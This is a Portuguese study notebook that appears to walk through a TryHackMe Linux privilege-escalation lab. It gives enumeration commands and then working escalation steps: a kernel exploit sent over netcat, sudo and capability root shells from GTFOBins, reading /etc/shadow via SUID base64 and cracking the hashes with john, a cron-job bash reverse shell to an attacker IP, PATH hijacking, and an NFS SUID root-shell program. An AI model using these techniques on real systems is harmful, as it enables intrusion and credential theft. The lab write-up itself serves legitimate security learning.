# Linux Privilege Escalation

## Enumeration

- Explicando os principais comandos para enumeração
    - `hostname`
        - Mostra o hostname do usuario logado
        - `hostname -I`
            - Mostra todos os ips que ele tem
    
    ---
    
    - `uname`
        - `uname -a` ou `uname --all`
            - Exibe todas as informações disponíveis, incluindo nome do kernel, nome da máquina, versão do kernel, arquitetura do processador e mais.
        - `uname -s` ou `uname --kernel-name`
            - Exibe apenas o nome do kernel.
        - `uname -n` ou `uname --nodename`
            - Exibe o nome da máquina (host).
        - `uname -r` ou `uname --kernel-release`
            - Exibe a versão do kernel.
        - `uname -v` ou `uname --kernel-version`
            - Exibe informações mais detalhadas sobre a versão do kernel.
        - `uname -m` ou `uname --machine`
            - Exibe a arquitetura do processador.
        - `uname -p` ou `uname --processor`
            - Exibe o tipo de processador.
        - `uname -i` ou `uname --hardware-platform`
            - Exibe a plataforma de hardware.
        - `uname -o` ou `uname --operating-system`
            - Exibe o nome do sistema operacional.
        - `uname -l` ou `uname --language`
            - Exibe o idioma do sistema.
        - `uname -c` ou `uname --config`
            - Exibe as configurações do kernel.
        - `uname -u` ou `uname --show-updates`
            - Exibe informações sobre atualizações
    
    ---
    
    - `ps`
        - O `ps` é uma ferramenta poderosa para monitorar o sistema e entender a carga de trabalho da CPU.
        - `ps aux`
            - Exibe uma lista detalhada de todos os processos em execução no sistema, incluindo informações sobre o proprietário do processo, uso de CPU, uso de memória e muito mais.
        - `ps -e`
            - Exibe informações sobre todos os processos em execução, incluindo processos de outros usuários.
        - `ps -ef`
            - Exibe uma listagem completa de processos com informações sobre o proprietário, o PID (Identificação do Processo), o status, o terminal associado e o nome do comando.
        - `ps -eH`
            - Mostra os processos hierarquicamente, exibindo as relações entre processos pai e filhos.
        - `ps -o`
            - Permite personalizar a saída para incluir apenas as colunas de informações que você deseja. Por exemplo, `ps -eo pid,ppid,cmd` exibiria apenas o PID, PPID (ID do Processo Pai) e o comando associado a cada processo.
        - `ps -aux --sort=-%cpu`
            - Exibe todos os processos com detalhes, ordenados em ordem decrescente de uso de CPU.
        - `ps axjf`
            - `a`
                - Exibe processos de todos os usuários, não apenas do usuário atual.
            - `x`
                - Mostra todos os processos, mesmo aqueles que não estão associados a um terminal.
            - `j`
                - Formata a saída no estilo de listagem de processos hierárquicos (formato de árvore), exibindo informações como o ID do processo (PID), o ID do processo pai (PPID), o PGID (ID do Grupo de Processos) e outros detalhes.
            - `f`
                - Usada para exibir uma exibição completa de informações detalhadas sobre os processos
    
    ---
    
    - `env`
        - Usado em sistemas Unix-like, como Linux, para exibir as variáveis de ambiente disponíveis ou para executar um comando com variáveis de ambiente específicas. As variáveis de ambiente são informações que o sistema operacional utiliza para armazenar dados temporários, como configurações do usuário, caminhos de busca para executáveis, entre outras informações do sistema.
        - Suponha que você queira executar o comando `ls` com um `PATH` modificado temporariamente. Aqui está como você pode fazer isso usando o comando `env`:
            
            ```bash
            env PATH=/caminho/personalizado:$PATH ls
            ```
            
    
    ---
    
    - `sudo -l`
        - O comando `sudo -l` é usado para listar os privilégios de sudo que um usuário específico tem em um sistema Unix-like, como o Linux. A opção `-l` permite que um usuário veja uma lista das permissões que foram configuradas para eles no arquivo `/etc/sudoers`.
        - Exemplo
            - Ao executar o comando `sudo -l`, o sistema solicitará que você insira sua senha, após o qual ele exibirá as permissões que você tem. Isso pode incluir uma lista de comandos que você pode executar como superusuário (root) sem precisar digitar sua senha novamente.
            - A saída do comando `sudo -l` mostrará algo semelhante a:
                
                ```bash
                User username may run the following commands on this host:
                    (ALL) ALL
                ```
                
    
    ---
    
    - `id`
        - O comando `id` é usado em sistemas Unix-like, como o Linux, para exibir informações sobre o usuário e o grupo associados ao processo que está sendo executado ou para exibir informações sobre um usuário específico, quando fornecido um nome de usuário como argumento.
        - Quando você executa o comando `id` sem argumentos, ele exibe informações sobre o usuário e grupo do processo atual, incluindo o UID (User ID), GID (Group ID) e os grupos secundários do usuário.
        - Aqui está como você pode usar o comando `id` com um argumento para exibir informações sobre um usuário específico:
            
            ```bash
            id <nome_do_usuário>
            ```
            
    
    ---
    
    - `netstat`
        - `netstat -a`
            - Esse comando mostra todas as portas em escuta e conexões estabelecidas. Ele fornece uma visão abrangente das conexões ativas e passivas da rede.
        - `netstat -at` ou `netstat -au`
            - Essas variações podem ser usadas para listar especificamente os protocolos TCP (`t`) ou UDP (`u`). Isso permite que você foque em conexões de um protocolo específico.
        - `netstat -l`
            - Esse comando lista portas no modo "escuta". Essas portas estão abertas e prontas para aceitar conexões de entrada. Quando combinado com a opção `t` (`netstat -lt`), lista apenas as portas que estão em escuta usando o protocolo TCP.
        - `netstat -t`
            - Essa opção exibirá uma lista de portas TCP
        - `netstat -u`
            - Essa opção exibirá uma lista de portas UDP
        - `netstat -l`
            - Listar portas de escuta
        - `netstat -n`
            - Números de portas em vez de nomes de serviços
        - `netstat -s`
            - Isso exibirá estatísticas de protocolo para várias camadas da pilha de rede, como ICMP, TCP, UDP e outros.
    
    ---
    
    - `find` (chave)
        - `find . -name flag1.txt`
            - encontre o arquivo chamado "flag1.txt" no diretório atual.
        - `find /home -name flag1.txt`
            - encontre o arquivo chamado "flag1.txt" no diretório /home.
        - `find / -type d -name config`
            - encontre o diretório chamado "config" em "/".
        - `find / -type f -perm 0777`
            - encontre arquivos com permissões 777 (arquivos legíveis, graváveis e executáveis por todos os usuários).
        - `find / -perm a=x`
            - encontre arquivos executáveis.
        - `find /home -user frank`
            - encontre todos os arquivos do usuário "frank" no diretório /home.
        - `find / -mtime 10`
            - encontre arquivos que foram modificados nos últimos 10 dias.
        - `find / -atime 10`
            - encontre arquivos que foram acessados nos últimos 10 dias.
        - `find / -cmin -60`
            - encontre arquivos alterados nas últimas 60 minutos.
        - `find / -amin -60`
            - encontre arquivos acessados nas últimas 60 minutos.
        - `find / -size 50M`
            - encontre arquivos com tamanho de 50 MB.
        - `find / -writable -type d 2>/dev/null`
            - Encontrar pastas com permissões de escrita para todos ("world-writeable").
        - `find / -perm -222 -type d 2>/dev/null`
            - Encontrar pastas com permissões de escrita para todos ("world-writeable").
        - `find / -perm -o w -type d 2>/dev/null`
            - Encontrar pastas com permissões de escrita para todos ("world-writeable").
        - `find / -perm -o x -type d 2>/dev/null`
            - Encontrar pastas com permissões de execução para outros.
        - `find / -name perl*`
            - Encontrar arquivos ou pastas com nomes começando com "perl".
        - `find / -name python*`
            - Encontrar arquivos ou pastas com nomes começando com "python".
        - `find / -name gcc*`
            - Encontrar arquivos ou pastas com nomes começando com "gcc".
        - `find / -perm -u=s -type f 2>/dev/null`
            - Encontrar arquivos com permissões "setuid"
        - `find / -user root -perm -4000 2>/dev/null`
            - Encontrar arquivos que pertencem ao usuário root e têm a permissão "setuid" definida (permissão especial que permite que um programa seja executado com as permissões do proprietário).
        - `find / -perm -2000 2>/dev/null`
            - Encontrar arquivos que têm a permissão "setgid" definida (permissão especial que permite que um programa seja executado com as permissões do grupo) ou permissão "sticky" definida (geralmente usada em diretórios para restringir exclusão de arquivos somente para o proprietário original do arquivo).
        - `find / -perm -04000 -ls 2>/dev/null`
            - Encontrar arquivos que têm a permissão "setuid" definida (permissão especial que permite que um programa seja executado com as permissões do proprietário).
        - `find / -type f -perm -04000 -ls 2>/dev/null`
            - Esse comando do Linux executa uma pesquisa por arquivos regulares (não diretórios) com a permissão "setuid" definida. O "setuid" é uma permissão especial que permite que um executável seja executado com os privilégios do proprietário do arquivo.
    
    ---
    
    - `getcap` (superporder)
        - `getcap -r / 2>/dev/null`
            - Esse comando verifica se os programas têm superpoderes
        - `showmount -e 10.10.142.130`
            - Faz o mesmo

---

- Explicando os arquivos
    - `/proc/version`
        - O arquivo `/proc/version` é um arquivo especial em sistemas 
        operacionais baseados em Unix (como o Linux) que contém informações 
        sobre a versão do kernel em execução no sistema. Você pode acessar e 
        visualizar o conteúdo deste arquivo para obter detalhes sobre a 
        compilação do kernel e outras informações relacionadas.
    - `/etc/issue`
        - O arquivo `/etc/issue` é um arquivo de texto que é exibido no
         momento em que um usuário faz login no sistema, seja através de uma 
        sessão de terminal ou de uma conexão remota. Ele é usado para exibir 
        informações sobre o sistema operacional ou outras mensagens relevantes 
        para os usuários antes que eles digitem suas credenciais de login.
    - `/etc/passwd`
        - Armazena informações sobre contas de usuário no sistema
    - `/etc/shadow`
        - Armazena as informações de senha criptografadas dos usuários
    - `/etc/os-release`
        - Isso exibirá uma série de informações sobre a distribuição, incluindo o nome e a versão. A saída será semelhante a:
    - `/etc/crontab`
        - Este é um arquivo de configuração especial localizado no diretório `/etc` (que contém configurações do sistema). Ele define tarefas agendadas que serão executadas em horários específicos.
    - `/etc/exports`
        - `cat /etc/exports`
            
            O arquivo `/etc/exports` é um arquivo de configuração usado no sistema operacional Linux para definir quais diretórios e recursos compartilhados serão disponibilizados através do protocolo NFS (Network File System) para outros computadores na rede.
            
        - `showmount -e 10.10.142.130`
            - Mostra de fora mais simples o `/etc/exports`
            - Esse comando pode ser feito de outra maquina

---

- Resportas
    
    ### What is the hostname of the target system?
    
    ```bash
    uname -n
    ```
    
    - `wade7363`
    
    ### What is the Linux kernel version of the target system?
    
    ```bash
    uname -r
    ```
    
    - `3.13.0-24-generic`
    
    ### What Linux is this?
    
    ```bash
    cat /etc/os-release
    ```
    
    - `Ubuntu 14.04 LTS`
    
    ### What version of the Python language is installed on the system?
    
    ```bash
    python --version
    ```
    
    - `2.7.6`
    
    ### What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)
    
    - Pesquisando: `3.13.0-24-generic cve exploit db`
        - [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)
    - `CVE-2015-1328`

---

## Automated Enumeration Tools

- Ferramentas
    - Várias ferramentas podem ajudar a economizar tempo durante o processo de enumeração. Essas ferramentas devem ser usadas apenas para economizar tempo, sabendo que podem não identificar todos os vetores de escalonamento de privilégios. Abaixo está uma lista de ferramentas populares de enumeração para Linux, com links para seus respectivos repositórios no Github.
    - O ambiente do sistema alvo irá influenciar a ferramenta que você poderá usar. Por exemplo, você não conseguirá executar uma ferramenta escrita em Python se ela não estiver instalada no sistema alvo. É por isso que seria melhor estar familiarizado com algumas ferramentas, em vez de depender de uma única ferramenta.
    - **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
    - **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
    - **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
    - **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
    - **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

---

## Privilege Escalation: Kernel Exploits

- Vamos ver primeiro onde podemos escrever
    
    ```bash
    find / -writable -type d 2>/dev/null
    ```
    
- Entao vamos para algumas dessa pastas, eu irei para o `tmp`
    
    ```bash
    cd /tmp
    ```
    
- Agora na nossa maquina vamos mandar o arquivo da CVE que encontramos
    
    ```bash
    sudo nc -nvlp 777 -s 10.8.154.250 < Downloads/37292.c
    ```
    
- Agora no alvo vamos baixar esse arquivo
    
    ```bash
    nc 10.8.154.250 777 > 37292.c
    ```
    
- Depois, conforme indicado no arquivo, precisamos conceder permissão de compilar e se precisar execução
    
    ```bash
    gcc 37292.c -o exploit
    ./exploit
    passwd
    #root
    #root
    su root
    find / -name flag*.txt
    cat /home/matt/flag1.txt
    ```
    
- `THM-28392872729920`

---

## Privilege Escalation: Sudo

- Explicacao
    - Qualquer usuário pode verificar sua situação atual relacionada aos privilégios de root usando o comando `sudo -l`
    - [gtfobins](https://gtfobins.github.io/) é uma fonte valiosa que fornece informações sobre como qualquer programa, no qual você pode ter direitos sudo, pode ser usado.
    
- Resportas
    
    ### How many programs can the user "karen" run on the target system with sudo rights?
    
    ```bash
    sudo -l
    ```
    
    - `3`
    
    ### What is the content of the flag2.txt file?
    
    ```bash
    sudo find . -exec /bin/sh \; -quit
    cat /home/ubuntu/fla*
    ```
    
    ### How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
    
    ```bash
    find / -perm -04000 -ls 2>/dev/null
    ```
    
    - Mesmo nao tendo o nmap, vamos ver no [https://gtfobins.github.io/gtfobins/nmap/#sudo](https://gtfobins.github.io/gtfobins/nmap/#sudo)
    - `sudo nmap --interactive`
    
    ### What is the hash of frank's password?
    
    ```bash
    getent shadow
    ```
    
    - `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1`

---

## Privilege Escalation: SUID

### Which user shares the name of a great comic book writer?

```bash
getent passwd
#gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
```

- `gerryconway`

### What is the password of user2?

```bash
find / -type f -perm -04000 -ls 2>/dev/null
#1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
```

- Entao com o base64 podemos ler arquivo
- E para descriptografar as senhas vamos precisar no passwd e do shadow, para pegar o usuario e a senha respectivamente
    
    ```bash
    base64 /etc/passwd | base64 -d
    ```
    
- Agora vamos salvar esse resultado em um arquivo no nosso pc
- E o mesmo para o shadow
    
    ```bash
    base64 /etc/shadow | base64 -d
    ```
    
- Salvar esse tambem
- Entrando na pasta do john/run
    
    ```bash
    ./unshadow ~/Desktop/passwd.txt ~/Desktop/shadow.txt > ../crack
    ./john --wordlist=wordlist/rockyou.txt ../crack
    ./john ../crack --show
    #gerryconway:test123:1001:1001::/home/gerryconway:/bin/sh
    #user2:Password1:1002:1002::/home/user2:/bin/sh
    #karen:Password1:1003:1003::/home/karen:/bin/sh
    ```
    
- `Password1`

### What is the content of the flag3.txt file?

```bash
cd /home/ubuntu
base64 flag3.txt | base64 -d
```

- `THM-3847834`

---

## Privilege Escalation: Capabilities

### How many binaries have set capabilities?

```bash
getcap -r / 2>/dev/null
```

- `6`

### What other binary can be used through its capabilities?

- `view`

### What is the content of the flag4.txt file?

- Ja que temos basicamente 2 arquivos para trabalhar, vamos ver mais sobre eles
    
    ```bash
    find / -name vim 2>/dev/null
    find / -name view 2>/dev/null
    ```
    
- Vamos escolher qualquer um e ir no GTFOBins e pegar algum deles na categoria `Capabilities` , e vamos pegar em `/home` dependendo de qual escolher vai estar em outro lugar
    
    ```bash
    /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    find / -name flag4.txt 2>/dev/null
    cat /home/ubuntu/flag4.txt
    ```
    
- ou Tambem
    
    ```bash
    view /home/ubuntu/flag4.txt
    ```
    
- `THM-9349843`

---

## Privilege Escalation: Cron Jobs

### How many user-defined cron jobs can you see on the target system?

```bash
cat /etc/crontab
```

- `4`

### What is the content of the flag5.txt file?

```bash
cat /etc/crontab
```

- Perceba que tem 4 dele e procurando tanto com o locate quanto o find, nao achamos esse arquivo, entao vamos criar um arquivo q substitua ele/s para o sistema rodar sozinho por nos
- Tanto faz qual vc fara, porem que que estar com o nome correto, e na pasta correta
- Porem voce precisa saber onde voce pode escrever ent
    
    ```bash
    find / -writable -type d 2>/dev/null
    nano /home/karen/backup.sh
    ```
    
    - Conteudo do arquivo
    
    ```bash
    #!/bin/bash
    
    bash -i >& /dev/tcp/10.8.154.250/777 0>&1
    ```
    
- Apos salvar, basta abrir a porta que voce colocou
    
    ```bash
    sudo nc -nvlp 777 -s 10.8.154.250
    ```
    
- Entao espere o sistema rodar seu programa ser executado para seu shell reverso
    
    ```bash
    find / -name flag*.txt 2>/dev/null
    cat /home/ubuntu/flag5.txt
    ```
    
- `THM-383000283`

### What is Matt's password?

- Vamos fazer do mesmo jeito que o [What is the password of user2?](https://www.notion.so/What-is-the-password-of-user2-29e42cc17c32483a9e3be0e18fa795d3?pvs=21)
- Vamos copiar todo o conteudo de `passwd` e `shadow` cada um em um arquivo
- Lembrando que devemos estar na pasta do `john/run` para fazer os comando do `john`
    
    ```bash
    ./unshadow ~/Desktop/passwd.txt ~/Desktop/shadow.txt > ../crack.txt
    ```
    
- Agora vamos crackear as senhas
    
    ```bash
    ./john --wordlist=/home/fabis/important/ArquivosH/wordlist/rockyou.txt ../crack.txt
    ./john ../crack.txt --show
    ```
    
- `matt:123456:1002:1002::/home/matt:/bin/sh`

---

## Privilege Escalation: PATH

### What is the odd folder you have write access for?

```bash
sudo -l
find / -type f -perm -04000 -ls 2>/dev/null
#256346     20 -rwsr-xr-x   1 root     root               16712 Jun 20  2021 /home/murdoch/test
```

`/home/murdoch`

### What is the content of the flag6.txt file?

- Perceba q ele vai executar como root
    
    ```bash
    cd /home/murdoch
    ./test
    #sh: 1: thm: not found
    ```
    
- Entao vamos crirar esse `thm`
- Primeiro vamos procurar onde podemos escrever
    
    ```bash
    find / -writable -type d 2>/dev/null
    ```
    
- Vou usar no `/tmp`
    
    ```bash
    nano /tmp/thm
    ```
    
    - Conteudo
        
        ```bash
        /bin/bash
        ```
        
- Vamos dar premissao para o arquivo
    
    ```bash
    chmod 777 /tmp/thm
    ```
    
- Agora vamos executar o `./test`
    
    ```bash
    ./test
    ```
    
- Entao vamos pegar a flag
    
    ```bash
    find / -name flag*.txt 2>/dev/null
    cat /home/matt/flag6.txt
    ```
    

---

## Privilege Escalation: NFS

- O elemento crítico para este vetor de escalonamento de privilégios é a opção “no_root_squash”. Por padrão, o NFS mudará o usuário root para nfsnobody e impedirá que qualquer arquivo opere com privilégios de root. Se a opção “no_root_squash” estiver presente em um compartilhamento gravável, podemos criar um executável com conjunto de bits SUID e executá-lo no sistema de destino.
- O usuário root tem privilégios ilimitados em um sistema. Ao conceder acesso total a arquivos e diretórios remotos ao root, você estaria efetivamente concedendo privilégios administrativos completos a qualquer computador remoto que acessasse seus recursos via NFS. Isso poderia levar a erros acidentais ou abusos maliciosos. Por isso acontece essa troca.

### How many mountable shares can you identify on the target system?

```bash
getcap -r / 2>/dev/null
#ou
showmount -e 10.10.142.130
```

- `3`

### How many shares have the "no_root_squash" option enabled?

```bash
getcap -r / 2>/dev/null
```

- `3`

### What is the content of the flag7.txt file?

- Vamos ver novamente as pastas que podem ser compartilhada (da vitima), para linkar com alguma do nosso pc (atacante)
- Sintaxe
    
    ```bash
    mount -o rw <ipvitima>:/pasta/vitima/que/compartilha /nossa/pasta/qualquer/nosso/pc/atacante
    ```
    
    - -o rw vai dar permisao de escrever e ler
- O meu fico assim
    
    ```bash
    mount -o rw 10.10.142.130:/tmp/machine /tmp/atacante/
    ```
    
- No nosso pc vamos criar um executavel `.c`
    
    ```bash
    int main()
    {
    	setgid(0);
    	setuid(0);
    	system("/bin/bash");
    	return 0;
    }
    ```
    
- Agora vamos compilar
    
    ```bash
    sudo gcc prog.c -o progexec -w
    #prog.c eh meu programa
    ```
    
- Entao no pc da vitima
    
    ```bash
    ./progexec
    ```
    

---

## Capstone Challenge

```bash
sudo -l
find / -type f -perm -04000 -ls 2>/dev/null
#16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base6
```

- Salvar o arquivo passwd e shadow
    
    ```bash
    base64 /etc/passwd | base64 -d
    base64 /etc/shadow | base64 -d
    ```
    
- Na pasta do `john/run`
    
    ```bash
    ./unshadow ~/Desktop/passwd.txt ~/Desktop/shadow.txt > ~/Desktop/crack.txt
    ./john --wordlist=/usr/share/wordlist/rockyou.txt ~/Desktop/crack.txt
    ./john ~/Desktop/crack.txt --show
    #leonard:Penny123:1000:1000:leonard:/home/leonard:/bin/bash
    #missy:Password1:1001:1001::/home/missy:/bin/bash
    ```
    
- Trocando user
    
    ```bash
    su missy
    #Password1
    sudo -l
    sudo find . -exec /bin/sh \; -quit
    ```
    
- Pegando flags
    
    ```bash
    find / -name flag*.txt 2>/dev/null
    cat /home/missy/Documents/flag1.txt
    cat /home/rootflag/flag2.txt
    ```
    
- `THM-42828719920544`
- `THM-168824782390238`